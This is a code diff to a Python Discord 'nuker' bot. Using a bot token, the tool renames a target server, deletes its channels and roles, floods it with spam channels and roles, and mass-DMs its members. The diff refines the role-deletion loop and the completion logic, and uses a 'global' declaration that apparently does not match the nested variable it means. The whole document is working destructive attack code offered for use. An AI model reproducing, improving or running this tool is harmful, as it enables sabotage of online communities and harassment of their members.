@@ -44,6 +44,8 @@ def bot_nuker():
         role_spam_times = int(input("Number of roles to create: "))
         message_spam_times = int(input("Number of messages to spam in each channel: "))
 
+        complete = False
+
         async def delete_channel(channel):
             try:
                 await channel.delete()
@@ -151,8 +153,22 @@ def bot_nuker():
                 await asyncio.sleep(1)
                 await dm_member(user_id)
 
+        async def delete_all_roles(guild, guild_roles):
+            global complete
+            while True:
+                deletable_roles = [role for role in guild_roles if role < guild.me.top_role and role != guild.default_role and not role.managed]
+                for role in deletable_roles:
+                    await delete_role(role)
+                if not deletable_roles:
+                    complete = True
+                    break
+            
+
         @bot.event
         async def on_ready():
+            guild = bot.get_guild(guild_id)
+
+            bot.loop.create_task(delete_all_roles(guild, guild.roles))
 
             headers = {
                 'Authorization': f'Bot {token}',
@@ -176,7 +192,6 @@ def bot_nuker():
                         response_text = await response.text()
                         await asynccprint(f"Failed to update guild settings. Status code: {response.status}, Response: {response_text}", 1)
 
-            guild = bot.get_guild(guild_id)
             await guild.edit(name=guild_name)
             if response.ok:
                 await asynccprint(f"Changed server name to \"{guild_name}\"", 0)
@@ -186,17 +201,15 @@ def bot_nuker():
 
             while True:
 
-                deletable_channels = [channel for channel in guild.channels]
-                deletable_roles = [role for role in guild.roles if role.position < guild.me.top_role.position and role != guild.default_role and not role.managed]
+                deletable_channels = [channel for channel in guild.channels if channel != guild.rules_channel and channel != guild.public_updates_channel and channel != guild.system_channel]
 
-                if not deletable_channels and not deletable_roles:
-                    await asynccprint("All deletable channels and roles have been successfully deleted.", 0)
+                if not deletable_channels:
+                    await asynccprint("All deletable channels have been successfully deleted.", 0)
                     break
 
                 delete_channels = [asyncio.create_task(delete_channel(channel)) for channel in deletable_channels]
-                delete_roles = [asyncio.create_task(delete_role(role)) for role in deletable_roles]
 
-                await asyncio.gather(*delete_channels, *delete_roles)
+                await asyncio.gather(*delete_channels)
 
             create_channels = [asyncio.create_task(create_channel(guild)) for _ in range(channel_spam_times)]
             create_roles = [asyncio.create_task(create_role(guild)) for _ in range(role_spam_times)]
@@ -207,8 +220,12 @@ def bot_nuker():
             for member in members:
                 await dm_member(member)
 
-            await asynccprint(f"Successfully Nuked {guild_id}", 0)
-            await bot.close()
+            while True:
+                if complete == True:
+                    await asynccprint(f"Successfully Nuked {guild_id}", 0)
+                    await bot.close()
+                else:
+                    await asyncio.sleep(5)
 
         bot.run(token)
     except Exception as e:
